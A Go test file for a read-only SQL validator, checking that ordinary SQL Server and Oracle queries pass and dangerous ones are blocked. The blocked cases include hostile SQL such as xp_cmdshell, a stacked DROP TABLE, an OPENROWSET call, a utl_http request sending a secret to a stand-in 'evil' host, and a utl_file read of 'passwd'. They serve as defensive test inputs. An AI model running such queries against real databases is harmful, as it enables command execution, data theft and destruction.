package dbexec

import "testing"

// Queries a 537-table SQL Server schema legitimately produces. None of these
// writes anything; every one of them must run.
// Identifiers that merely look like a dangerous call must run. These are the
// exact shapes that were blocked when the check used strings.Contains.
func TestLookalikeIdentifiersAllowed(t *testing.T) {
	for _, q := range []string{
		"SELECT exp_date, exp_amount FROM dbo.Contracts",
		"SELECT bulk_qty FROM dbo.OrderLines",
		"SELECT * FROM dbo.BulkOrders",
		"SELECT resp_time, disp_name FROM dbo.Log",
	} {
		if err := Validate(q); err != nil {
			t.Errorf("FALSE POSITIVE %s -> %v", q, err)
		}
	}
}

// The prefix families are still caught by their real names.
func TestDangerousPrefixesStillCaught(t *testing.T) {
	for _, q := range []string{
		"SELECT * FROM t WHERE x = xp_cmdshell('dir')",
		"SELECT sp_executesql(1)",
		"SELECT sp_OACreate(1)",
		"SELECT * FROM OPENROWSET(BULK 'c:/f.csv', SINGLE_CLOB) x",
	} {
		if Validate(q) == nil {
			t.Errorf("MISSED %s", q)
		}
	}
}

func TestNoFalsePositivesOnEnterpriseSchema(t *testing.T) {
	ok := []struct{ name, sql string }{
		{"plain top-n", "SELECT TOP 10 * FROM dbo.Orders"},
		{"join", "SELECT c.Name, o.Total FROM dbo.Customers c JOIN dbo.Orders o ON o.CustomerId = c.Id"},
		{"bracketed", "SELECT [Name], [Total] FROM [dbo].[Orders]"},
		{"cte", "WITH r AS (SELECT * FROM dbo.Orders) SELECT * FROM r"},
		{"created column", "SELECT created_at, updated_at FROM dbo.Orders"},
		{"expiry column", "SELECT exp_date FROM dbo.Contracts"},
		{"expiry qualified", "SELECT c.exp_date, c.exp_amount FROM dbo.Contracts c"},
		{"bulk column", "SELECT bulk_qty, unit_price FROM dbo.OrderLines"},
		{"bulk table", "SELECT * FROM dbo.BulkOrders"},
		{"execution column", "SELECT execution_time FROM dbo.JobRuns"},
		{"callcenter table", "SELECT * FROM dbo.CallCenterLog"},
		{"aggregate", "SELECT DeptId, COUNT(*) AS n FROM dbo.Employees GROUP BY DeptId"},
		{"window fn", "SELECT Id, ROW_NUMBER() OVER (ORDER BY CreatedAt DESC) rn FROM dbo.Orders"},
		{"string literal with keyword", "SELECT * FROM dbo.Audit WHERE Action = 'delete'"},
		{"trailing semicolon", "SELECT 1;"},
		// Oracle reads that look scary but are ordinary.
		{"oracle dual", "SELECT SYSDATE FROM dual"},
		{"dbms_random", "SELECT * FROM (SELECT * FROM employees ORDER BY dbms_random.value) WHERE ROWNUM <= 5"},
		{"dbms_lob read", "SELECT id, dbms_lob.getlength(doc_blob) FROM documents"},
		{"utl-ish column", "SELECT util_score, sutl_flag FROM metrics"},
	}
	for _, c := range ok {
		if err := Validate(c.sql); err != nil {
			t.Errorf("FALSE POSITIVE %-24s -> %v", c.name, err)
		}
	}
}

// The guard must keep catching these.
func TestStillBlocksWrites(t *testing.T) {
	bad := []struct{ name, sql string }{
		{"delete", "DELETE FROM dbo.Orders"},
		{"select into", "SELECT * INTO backup FROM dbo.Users"},
		{"stacked", "SELECT 1; DROP TABLE dbo.Users"},
		{"writing cte", "WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d"},
		{"xp_cmdshell", "SELECT * FROM dbo.T WHERE 1=1; EXEC xp_cmdshell 'dir'"},
		{"openrowset", "SELECT * FROM OPENROWSET('SQLNCLI','','SELECT 1')"},
		// Oracle escape hatches inside a plain SELECT.
		{"utl_http", "SELECT utl_http.request('http://evil/' || secret) FROM vault"},
		{"utl_file", "SELECT utl_file.fgetattr('DIR','passwd') FROM dual"},
		{"dbms_scheduler", "SELECT dbms_scheduler.create_job('j','PLSQL_BLOCK','x') FROM dual"},
	}
	for _, c := range bad {
		if err := Validate(c.sql); err == nil {
			t.Errorf("MISSED %-20s -> allowed", c.name)
		}
	}
}
